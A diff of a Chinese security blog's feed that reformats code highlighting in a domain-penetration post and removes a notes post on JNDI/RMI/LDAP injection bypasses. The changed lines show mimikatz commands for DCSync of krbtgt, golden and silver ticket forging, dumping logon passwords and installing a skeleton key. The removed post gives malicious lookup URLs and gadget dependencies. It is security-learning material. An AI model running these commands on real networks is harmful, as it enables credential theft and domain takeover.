 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz &lt;span class=&#34;s2&#34;&gt;&amp;#34;lsadump::dcsync /domain:xx.com /user:krbtgt&amp;#34;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz &lt;span class=&#34;s2&#34;&gt;&amp;#34;lsadump::dcsync /domain:xx.com /user:krbtgt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1178,14 +1296,14 @@ sekurlsa::pth /user:xxx /domain:xxx /aes256:xxxxxxxx&lt;span class=&#34;s2&#34;&
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
-
-
-kerberos::ptt test.kiribi #导入刚才生成的票据
-
-
-&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; \\dc.abc.com\c$  #导入成功后可获取域管权限
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::ptt test.kiribi #导入刚才生成的票据
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; \\dc.abc.com\c$  #导入成功后可获取域管权限
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;白银票据&#34;&gt;白银票据&lt;/h3&gt;
 &lt;blockquote&gt;
@@ -1269,8 +1387,8 @@ kerberos::ptt test.kiribi #导入刚才生成的票据
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz.exe &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::logonpasswords&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; 1.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::logonpasswords&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; 1.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;2.伪造白银票据&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt
@@ -1287,7 +1405,7 @@ kerberos::ptt test.kiribi #导入刚才生成的票据
 &lt;h3 id=&#34;skeleton-key&#34;&gt;skeleton key&lt;/h3&gt;
 &lt;p&gt;skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#在域控上安装 skeleton key
-mimikatz.exe privilege::debug &amp;quot;misc::skeleton&amp;quot;
+mimikatz.exe privilege::debug &amp;#34;misc::skeleton&amp;#34;
 
 #在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
 net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator`
@@ -1342,216 +1460,6 @@ misc::skeleton`
                             
                             
                                 <category scheme="https://blog.wh1sper.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" term="域渗透" label="域渗透" />
-                            
-                        
-                    
-                
-            
-        </entry>
-    
-        <entry>
-            <title type="text">JNDI、RMI、LDAP防御和绕过总结</title>
-            <link rel="alternate" type="text/html" href="https://blog.wh1sper.com/posts/jndirmildap%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" />
-            <id>https://blog.wh1sper.com/posts/jndirmildap%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
-            <updated>2022-12-27T16:23:03&#43;08:00</updated>
-            <published>2022-03-13T16:13:45&#43;08:00</published>
-            <author>
-                    <name>wh1sper</name>
-                    <uri>https://blog.wh1sper.com/</uri>
-                    <email>admin[at]wh1sper.com</email>
-                    </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">本篇原理分析较少，主要是总结梳理攻击，绕过手法 前置知识 RMI调用流程 RMI基于反序列化，每次数据交换都存在序列化-反序列化操作，由此延伸出对三端的攻击手法 JNDI攻击手法 通常 JNDI 注入攻击的都是 lookup 方法的执……</summary>
-            
-                <content type="html">&lt;p&gt;本篇原理分析较少，主要是总结梳理攻击，绕过手法&lt;/p&gt;
-&lt;h2 id=&#34;前置知识&#34;&gt;前置知识&lt;/h2&gt;
-&lt;h3 id=&#34;rmi调用流程&#34;&gt;RMI调用流程&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271610049.png&#34; alt=&#34;17cd7c7d4f9ef2c362efb3086c27417e.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;RMI基于反序列化，每次数据交换都存在序列化-反序列化操作，由此延伸出对三端的攻击手法&lt;/p&gt;
-&lt;h3 id=&#34;jndi攻击手法&#34;&gt;JNDI攻击手法&lt;/h3&gt;
-&lt;p&gt;通常 JNDI 注入攻击的都是 lookup 方法的执行者，一般步骤如下：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;目标机器中调用了 &lt;code&gt;InitialContext.lookup(URL)&lt;/code&gt;，且 URL 为用户可控&lt;/li&gt;
-&lt;li&gt;攻击者控制这个 URL 为一个恶意的 RMI 服务地址：&lt;code&gt;rmi://hack:port/name&lt;/code&gt;或者&lt;code&gt;ldap://xxx/xxx&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;恶意 RMI/ldap 服务会返回一个含有恶意 factory 的 Reference 对象或者直接返回恶意序列化数据&lt;/li&gt;
-&lt;/ol&gt;
-&lt;blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;JNDI 注入可以通过 RMI 方式和 LDAP 方式来达到攻击效果。&lt;/li&gt;
-&lt;li&gt;javax.naming.InitialContext.lookup(&#39;ldap://127.0.0.1:9999/#Exploit&#39;)&lt;/li&gt;
-&lt;li&gt;org.springframework.jndi.JndiLocatorDelegate.lookup(&#39;rmi://127.0.0.1:1099/refObj&#39;)&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/blockquote&gt;
-&lt;h2 id=&#34;jdk8u121&#34;&gt;&lt;strong&gt;jdk8u121&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;这个版本主要是ban掉了RMI的一些打法&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;从jdk8u121开始，RMI加入了反序列化白名单机制(&lt;strong&gt;&lt;a href=&#34;https://www.twblogs.net/a/5e4efb52bd9eee101df6892d&#34;&gt;JEP290&lt;/a&gt;&lt;/strong&gt;)&lt;/li&gt;
-&lt;li&gt;在jdk8u121之后，对于Reference加载远程代码，jdk的信任机制，在通过rmi加载远程代码的时候，会判断环境变量&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;是否为true，而其在121版本及后，默认为false。RMI远程Reference代码攻击方式开始失效&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;白名单绕过jep290绕过&#34;&gt;白名单绕过（JEP290绕过）&lt;/h3&gt;
-&lt;p&gt;可以看这篇：&lt;a href=&#34;https://www.anquanke.com/post/id/259059&#34;&gt;RMI-JEP290的分析与绕过 - 安全客，安全资讯平台&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;为了绕过&lt;strong&gt;JEP290&lt;/strong&gt;，ysoserial里面的JRMPClient链子，通过UnicastRef这个在RMI反序列化白名单内的gadget进行攻击：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;用&lt;code&gt;ysoserial&lt;/code&gt;启动一个恶意的&lt;code&gt;JRMPListener&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;受害者启动注册中心(RMI Registry)&lt;/li&gt;
-&lt;li&gt;攻击者启动Client调用&lt;code&gt;bind()&lt;/code&gt;操作&lt;/li&gt;
-&lt;li&gt;注册中心（受害者）被反序列化攻击&lt;/li&gt;
-&lt;/ol&gt;
-&lt;blockquote&gt;
-&lt;p&gt;如果我们可以控制 UnicastRef 中 LiveRef 所封装的 host、端口等信息，我们就可以发起一个任意的 JRMP 连接请求，这其实就是 ysoserial 中的 payloads.JRMPClient 的原理。&lt;/p&gt;
-&lt;p&gt;实际上ysoserial这个JRMPClient和JRMPListener就是利用JRMP协议对打&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;攻击过程：
-&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271611301.png&#34; alt=&#34;0a195b875b83dececc1d8526523878e3.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;后续修复和绕过：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;绕过的修复版本：jdk8u231，在JDK8u231的&lt;code&gt;dirty&lt;/code&gt;函数中多了&lt;code&gt;setObjectInputFilter&lt;/code&gt;过程，所以用&lt;code&gt;UnicastRef&lt;/code&gt;就没法再进行绕过了。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;1.&lt;/code&gt;修复版本的绕过：国外安全研究人员&lt;code&gt;@An Trinhs&lt;/code&gt;发现了一个gadgets利用链，能够直接反序列化&lt;code&gt;UnicastRemoteObject&lt;/code&gt;造成反序列化漏洞。参考：&lt;a href=&#34;https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1&#34;&gt;RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;blockquote&gt;
-&lt;p&gt;在上面的 Bypass 中，UnicastRef 类用了一层包装，通过递归的形式触发反序列化；通过 DGCClient 向 JRMPListener 发起 JRMP 请求，而这条 Gadget 是直接利用一次反序列化发起 JRMP 请求&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ol start=&#34;3&#34;&gt;
-&lt;li&gt;&lt;code&gt;2.&lt;/code&gt;绕过的修复版本：jdk8u241，在调用&lt;code&gt;UnicastRef.invoke&lt;/code&gt;之前，做了一个检测。声明方法的类，必须要实现&lt;code&gt;Remote&lt;/code&gt;接口，然而这里的&lt;code&gt;RMIServerSocketFactory&lt;/code&gt;并没有实现，于是无法进入到invoke方法，直接抛出错误。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;使用ldap&#34;&gt;使用ldap&lt;/h3&gt;
-&lt;p&gt;在这个版本还没有ban掉ldap的Reference对象和ldap直接返回恶意序列化数据&lt;/p&gt;
-&lt;h3 id=&#34;服务端object参数暴露&#34;&gt;服务端Object参数暴露&lt;/h3&gt;
-&lt;p&gt;这个其实就是正常RMI Client攻击Server的手法。&lt;/p&gt;
-&lt;p&gt;例如，远程调用的接口 RemoteInterface 存在一个 sayGoodbye 方法的参数是 Object 类型。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271612915.png&#34; alt=&#34;cad6d7a0109df4f446a58467d0dbf87c.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;RMI的传输100%基于反序列化，那我们就直接可以传一个反序列化 payload 进去执行反序列化。&lt;/p&gt;
-&lt;p&gt;如果参数不是Object还有后续绕过：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;由于攻击者可以完全控制客户端，因此他可以用恶意对象替换从Object类派生的参数（例如String）有几种方法：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;将java.rmi软件包的代码复制到新软件包，然后在其中更改代码&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;将调试器附加到正在运行的客户端，并在序列化对象之前替换对象&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;使用Javassist之类的工具更改字节码&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;通过实现代理来替换网络流上已经序列化的对象&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;也被su18师傅称为替身攻击：&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;大体的思路就是调用的方法参数是 HelloObject，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;afanti师傅用的是通过RASP hook住&lt;code&gt;java.rmi.server.RemoteObjectInvocationHandler&lt;/code&gt;类的&lt;code&gt;InvokeRemoteMethod&lt;/code&gt;方法的第三个参数非Object的改为Object的gadget。他的项目地址在&lt;a href=&#34;https://github.com/Afant1/RemoteObjectInvocationHandler&#34;&gt;RemoteObjectInvocationHandler&lt;/a&gt;。&lt;/p&gt;
-&lt;h2 id=&#34;jdk8u191&#34;&gt;jdk8u191&lt;/h2&gt;
-&lt;p&gt;这个版本ban掉了ldap的Reference对象&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;在jdk8u191之后，加入LDAP远程Reference代码信任机制，LDAP远程代码攻击方式开始失效，也就是系统变量&lt;code&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt;默认为false（CVE-2018-3149）&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;高版本绕过主要有两种方式：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;LDAP Server 直接返回恶意序列化数据，但需要目标环境存在 Gadget 依赖&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;使用本地 Factory 绕过（主要是利用了 &lt;code&gt;org.apache.naming.facotry.BeanFactory&lt;/code&gt; 类）&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;ldap直接返回序列化数据&#34;&gt;ldap直接返回序列化数据&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;搭建恶意LDAP Server，可以直接改 &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt; 里面的：&lt;/li&gt;
-&lt;li&gt;受害者 lookup 方法参数可控，执行 ldap://xxx/xxx&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;利用本地-factory-绕过&#34;&gt;利用本地 Factory 绕过&lt;/h3&gt;
-&lt;p&gt;在 Reference 类中的 factory Class，要求实现 ObjectFactory 接口，在 &amp;quot;NamingManager#getObjectFactoryFromReference&amp;quot; 方法中的逻辑是这样的：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;优先从本地加载 factory，这就要求 factory Class 在本地的 ClassPath 中&lt;/li&gt;
-&lt;li&gt;本地加载不到会从 codebase 处加载，&lt;strong&gt;但是由于高版本 jdk 默认不信任 codebase，在一般情况下无法利用&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;在加载完 factory 之后会强制类型转换为 &lt;code&gt;javax.naming.spi.ObjectFactory&lt;/code&gt; 接口类型，之后调用 &lt;code&gt;factory.getObjectInstance()&lt;/code&gt; 方法&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;所以如果找可以利用的 factory 就要满足下面的要求：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;在目标的 ClassPath 中，且实现了 &lt;code&gt;javax.naming.spi.ObjectFactory&lt;/code&gt; 接口&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;其 &lt;code&gt;getObjectInstance&lt;/code&gt; 方法可以被利用&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;（其中一条Gadget）这个可用的 factory 类为 &lt;code&gt;org.apache.naming.BeanFactory&lt;/code&gt;，位于 tomcat 的依赖包中，此外，这个 factory 绕过需要搭配 &lt;code&gt;javax.el.ELProcessor&lt;/code&gt; 执行任意的 EL 表达式来完成 RCE，依赖：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-XML&#34; data-lang=&#34;XML&#34;&gt; &lt;span class=&#34;nt&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
-     &lt;span class=&#34;nt&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.tomcat&lt;span class=&#34;nt&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
-     &lt;span class=&#34;nt&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;tomcat-catalina&lt;span class=&#34;nt&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
-     &lt;span class=&#34;nt&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;8.5.0&lt;span class=&#34;nt&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
- &lt;span class=&#34;nt&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
- 
- &lt;span class=&#34;c&#34;&gt;&amp;lt;!-- 加载ELProcessor时需要 --&amp;gt;&lt;/span&gt;
- &lt;span class=&#34;nt&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
-     &lt;span class=&#34;nt&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.tomcat.embed&lt;span class=&#34;nt&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
-     &lt;span class=&#34;nt&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;tomcat-embed-el&lt;span class=&#34;nt&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
-     &lt;span class=&#34;nt&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;8.5.0&lt;span class=&#34;nt&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
- &lt;span class=&#34;nt&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/942/&#34;&gt;如何绕过高版本 JDK 的限制进行 JNDI 注入利用 - 安全客&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1&#34;&gt;RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/259059&#34;&gt;RMI-JEP290的分析与绕过 - 安全客，安全资讯平台&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://y4er.com/post/bypass-jep290/&#34;&gt;Bypass JEP290 - Y4er&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html&#34;&gt;如何绕过高版本JDK的限制进行JNDI注入利用&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/&#34;&gt;浅析高低版JDK下的JNDI注入及绕过 [Mi1k7ea]&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://tttang.com/archive/1611/&#34;&gt;JNDI注入分析 - 跳跳糖&lt;/a&gt;&lt;/p&gt;
-</content>
-            
-            
-            
-            
-            
-                
-                    
-                        
-                            
-                            
-                            
-                                <category scheme="https://blog.wh1sper.com/categories/note/" term="note" label="note" />
-                            
-                        
-                    
-                
-                    
-                        
-                            
-                            
-                            
-                                <category scheme="https://blog.wh1sper.com/tags/jndi/" term="JNDI" label="JNDI" />
-                            
-                        
-                            
-                            
-                            
-                                <category scheme="https://blog.wh1sper.com/tags/rmi/" term="RMI" label="RMI" />
-                            
-                        
-                            
-                            
-                            
-                                <category scheme="https://blog.wh1sper.com/tags/ldap/" term="LDAP" label="LDAP" />
                             
                         
                     
